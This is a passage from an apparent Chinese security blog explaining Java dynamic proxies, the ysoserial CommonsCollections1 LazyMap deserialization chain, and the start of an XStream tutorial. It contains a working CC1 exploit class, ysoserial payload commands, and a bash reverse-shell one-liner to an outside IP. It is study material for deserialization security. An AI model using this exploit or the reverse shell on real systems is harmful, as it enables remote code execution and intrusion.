href="#4-3-3-代码示例" class="headerlink" title="4.3.3 代码示例"></a>4.3.3 代码示例</h3><p><strong>1.定义发送短信的接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy.dynamicProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SmsService</span> &#123;<br>    String <span class="hljs-title function_">send</span><span class="hljs-params">(String message)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2.实现发送短信的接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy.dynamicProxy;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.dynamicProxy.SmsServiceImpl.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/26 20:06</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SmsService</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">send</span><span class="hljs-params">(String message)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;send message:&quot;</span> + message);<br>        <span class="hljs-keyword">return</span> message;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3.定义一个 JDK 动态代理类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy.dynamicProxy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.dynamicProxy.DebugInvocationHandler.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/26 20:06</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DebugInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代理类中的真实对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DebugInvocationHandler</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//调用方法之前，我们可以添加自己的操作</span><br>        System.out.println(<span class="hljs-string">&quot;before method &quot;</span> + method.getName());<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> method.invoke(target, args);<br>        <span class="hljs-comment">//调用方法之后，我们同样可以添加自己的操作</span><br>        System.out.println(<span class="hljs-string">&quot;after method &quot;</span> + method.getName());<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>invoke()</code> 方法: 当我们的动态代理对象调用原生方法的时候，最终实际上调用到的是 <code>invoke()</code> 方法，然后 <code>invoke()</code> 方法代替我们去调用了被代理对象的原生方法。</p><p><strong>4.实际使用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy.dynamicProxy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.dynamicProxy.dynamicProxy.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/26 20:08</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dynamicProxy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">SmsServiceImpl</span> <span class="hljs-variable">smsService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmsServiceImpl</span>();<br>        <span class="hljs-type">SmsService</span> <span class="hljs-variable">smsServiceProxy</span> <span class="hljs-operator">=</span> (SmsService) Proxy.newProxyInstance(<br>                smsService.getClass().getClassLoader(), <span class="hljs-comment">// 目标类的类加载器</span><br>                smsService.getClass().getInterfaces(),  <span class="hljs-comment">// 代理需要实现的接口，可指定多个</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">DebugInvocationHandler</span>(smsService)  <span class="hljs-comment">// 代理对象对应的自定义 InvocationHandler</span><br>        );<br>        smsServiceProxy.send(<span class="hljs-string">&quot;Java is the best language!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getProxy()</code>：主要通过<code>Proxy.newProxyInstance（）</code>方法获取某个类的代理对象</p><p>运行上述代码之后，控制台打印出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">before method send<br>send message:Java is the best language!<br>after method send<br></code></pre></td></tr></table></figure><h2 id="4-4-总结"><a href="#4-4-总结" class="headerlink" title="4.4 总结"></a>4.4 总结</h2><p>说了这么多，我们需要知道的重点是什么呢？</p><ol><li>动态代理的创建方法，后续我们看到相关代码的时候能够知道这个是使用的动态代理；</li><li>什么时候会调用<code>invoke()</code>函数，当代理的对象调用方法的时候就会调用<code>InvocationHandler</code>中的<code>invoke()</code>函数；</li></ol><p>知道以上这两点，在以后的Java后序列化的学习中就差不多够用了。</p><h1 id="五、yso的CC1利用链"><a href="#五、yso的CC1利用链" class="headerlink" title="五、yso的CC1利用链"></a>五、yso的CC1利用链</h1><p>上面不是分析过CC1利用链了吗？那这里还分析什么？</p><p>这里分析的是CC1链的另一个实现版本，该CC1实现进行了部分修改：</p><ul><li>不在使用<code>TransformedMap</code>进行利用，而是采用<code>LazyMap</code>和<code>动态代理</code>技术实现利用链；</li><li>相同点在于都采用<code>InvokerTransformer</code>进行函数调用命令执行的功能；</li></ul><h2 id="5-1-LazyMap调用transform函数"><a href="#5-1-LazyMap调用transform函数" class="headerlink" title="5.1 LazyMap调用transform函数"></a>5.1 LazyMap调用transform函数</h2><p>通过查找用法可以看到<code>LazyMap</code>中的<code>get</code>函数调用了<code>transform</code>，照常需要知道<code>factory</code>属性是否可控，设置我们需要的值；</p><p>与此同时，<code>get</code>函数为public属性，可访问，传入参数可控；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408131340288.png" alt="img"></p><p>在<code>LazyMap</code>中发现一个<code>decorate</code>函数与<code>TransformedMap</code>的<code>decorate</code>函数类似，可以设置<code>factory</code>属性的值，这样我们也就可以指定内容调用<code>transform</code>函数；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408131342148.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408131342318.png" alt="img"></p><p>确定了这些以后，我们即可测试这部分内容是否可以构成利用，实践利用测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.LazyMap2transform.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/26 21:06</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap2transform</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, invokerTransformer);<br>        lazyMap.get(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>目前得到的流程图，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441240.png" alt="img"></p><h2 id="5-2-AnnotationInvocationHandler调用get函数"><a href="#5-2-AnnotationInvocationHandler调用get函数" class="headerlink" title="5.2 AnnotationInvocationHandler调用get函数"></a>5.2 AnnotationInvocationHandler调用get函数</h2><p>此处如果直接查找<code>get</code>函数的用法会有数不胜数的用法，但是在<code>AnnotationInvocationHandler</code>类中的<code>invoke</code>函数中也存在对<code>get</code>函数的调用；</p><p>并且可以发现这个<code>invoke函数</code>与我们上述讲的动态代理实现的那个invoke函数比较相似，至少在参数上一致</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172057651.png" alt="img"></p><p>我们发现该类中实现了<code>InvocationHandler</code>。</p><p>此时，想要调用<code>invoke</code>函数，我们就想到了动态代理。在一个类被代理了以后，通过代理调用该类的方法，就一定会调用该代理类重写<code>invoke</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172042051.png" alt="img"></p><p>与此同时，<code>AnnotationInvocationHandler</code>类中存在重写<code>readObject</code>函数，也可作为入口类使用；</p><p>在原先的<code>TransformeredMap</code>CC1链的基础之上进行理解，<code>readObject</code>函数作用入口，<code>memberValues</code>属性调用了<code>entrySet()</code>方法，所以我们对<code>memberValues</code>属性进行设置代理，当它调用<code>entrySet()</code>方法时，会进行动态代理，则会触发<code>invoke</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172055902.png" alt="img"></p><p>因此，最终得到以下的反序列化利用链（ChainedTransformer和ConstantTransformer的使用与之前分析的CC1链一致，不在详细讲解）:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/26 21:17</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationHandlerDeclaredConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationHandlerDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)annotationInvocationHandlerDeclaredConstructor.newInstance(Target.class, lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        invocationHandler = (InvocationHandler)annotationInvocationHandlerDeclaredConstructor.newInstance(Target.class, proxyMap);<br>        <span class="hljs-type">byte</span>[] ser = ser(invocationHandler);<br>        deser(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();   <span class="hljs-comment">//定义字节数组输出流</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);  <span class="hljs-comment">//定义输出流</span><br>        oos.writeObject(o); <span class="hljs-comment">//序列化对象</span><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser);  <span class="hljs-comment">//读取执行字节数组作为输入流</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);    <span class="hljs-comment">//将字节输入流作为输入流</span><br>        <span class="hljs-keyword">return</span> ois.readObject();    <span class="hljs-comment">//反序列化读取对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111442182.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    Gadget chain:</span><br><span class="hljs-comment">        ObjectInputStream.readObject()</span><br><span class="hljs-comment">            AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">                Map(Proxy).entrySet()</span><br><span class="hljs-comment">                    AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">                        LazyMap.get()</span><br><span class="hljs-comment">                            ChainedTransformer.transform()</span><br><span class="hljs-comment">                                ConstantTransformer.transform()</span><br><span class="hljs-comment">                                InvokerTransformer.transform()</span><br><span class="hljs-comment">                                    Method.invoke()</span><br><span class="hljs-comment">                                        Class.getMethod()</span><br><span class="hljs-comment">                                InvokerTransformer.transform()</span><br><span class="hljs-comment">                                    Method.invoke()</span><br><span class="hljs-comment">                                        Runtime.getRuntime()</span><br><span class="hljs-comment">                                InvokerTransformer.transform()</span><br><span class="hljs-comment">                                    Method.invoke()</span><br><span class="hljs-comment">                                        Runtime.exec()</span><br><span class="hljs-comment">    Requires:</span><br><span class="hljs-comment">        commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h1 id="六、yso工具的使用方法"><a href="#六、yso工具的使用方法" class="headerlink" title="六、yso工具的使用方法"></a>六、yso工具的使用方法</h1><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p><a href="https://github.com/Y4er/ysoserial">https://github.com/Y4er/ysoserial</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java8u65 -jar ysoserial-<span class="hljs-number">0.0</span><span class="hljs-number">.6</span>-SNAPSHOT-all.jar CommonsCollections3 <span class="hljs-string">&quot;calc&quot;</span> &gt; cc3.bin<br>java8u65 -jar ysoserial-<span class="hljs-number">0.0</span><span class="hljs-number">.6</span>-SNAPSHOT-all.jar CommonsCollections4 <span class="hljs-string">&quot;calc&quot;</span> &gt; cc4.bin<br>java8u65 -cp ysoserial-<span class="hljs-number">0.0</span><span class="hljs-number">.6</span>-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener <span class="hljs-number">5555</span> Jackson1 <span class="hljs-string">&quot;calc&quot;</span><br>java8u65 -jar ysoserial-<span class="hljs-number">0.0</span><span class="hljs-number">.6</span>-SNAPSHOT-all.jar JRMPClient <span class="hljs-string">&quot;127.0.0.1:5555&quot;</span> &gt; jrmpClient.bin<br>tar -xzf jdk-8u65-linux-x64.tar.gz<br>bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">43.139</span><span class="hljs-number">.222</span><span class="hljs-number">.190</span>/<span class="hljs-number">6666</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具教程</tag>
      
      <tag>反序列化</tag>
      
      <tag>Java</tag>
      
      <tag>动态代理</tag>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XStream反序列化基础</title>
    <link href="/2024/12/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/12/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="一、项目环境"><a href="#一、项目环境" class="headerlink" title="一、项目环境"></a>一、项目环境</h1><p>启动一个简单的 maven 项目</p><ul><li>jdk8u152</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143164.png" alt="img"></p><ul><li>导入依赖</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xstream<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="二、XStream-源码分析"><a href="#二、XStream-源码分析" class="headerlink" title="二、XStream 源码分析"></a>二、XStream 源码分析</h1><p>根据下面的 XStream 的 UML 设计图可以知道 XStream 大致可以分为 5 个部分（参考链接：<a href="about:blank">链接</a>）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143292.png" alt="img"></p><ol><li><strong>XStream</strong> 作为客户端对外提供 XML 解析与转换的相关方法</li><li><strong>AbstractDriver</strong> 为XStream提供流解析器和编写器的创建。目前支持XML（DOM，PULL）、JSON解析器。解析器<strong>HierarchicalStreamReader</strong>，编写器<strong>HierarchicalStreamWriter</strong>（PS：<strong>XStream</strong>默认使用了<strong>XppDriver</strong>）。</li><li><strong>MarshallingStrategy</strong> 编组和解组策略的核心接口，两个方法：<br>marshal：编组对象图<br>unmarshal:解组对象图<br><strong>TreeUnmarshaller</strong> 树解组程序，调用mapper和Converter把XML转化成java对象，里面的start方法开始解组，convertAnother方法把class转化成java对象。<br><strong>TreeMarshaller</strong> 树编组程序，调用mapper和Converter把java对象转化成XML，里面的start方法开始编组，convertAnother方法把java对象转化成XML。<br>它的抽象子类<strong>AbstractTreeMarshallingStrategy</strong>有抽象两个方法<br>createUnmarshallingContext<br>createMarshallingContext<br>用来根据不同的场景创建不同的<strong>TreeUnmarshaller</strong>子类和<strong>TreeMarshaller</strong>子类，使用了<strong>策略模式</strong>，如ReferenceByXPathMarshallingStrategy创建ReferenceByXPathUnmarshaller，ReferenceByIdMarshallingStrategy创建ReferenceByIdUnmarshaller（PS：<strong>XStream</strong>默认使用<strong>ReferenceByXPathMarshallingStrategy</strong>）。</li><li><strong>Mapper</strong> 映射器，XML的elementName通过mapper获取对应类、成员、属性的class对象。支持解组和编组，所以方法是成对存在real 和serialized，他的子类<strong>MapperWrapper</strong>作为装饰者，包装了不同类型映射的映射器，如AnnotationMapper，ImplicitCollectionMapper，ClassAliasingMapper。</li><li><strong>ConverterLookup</strong> 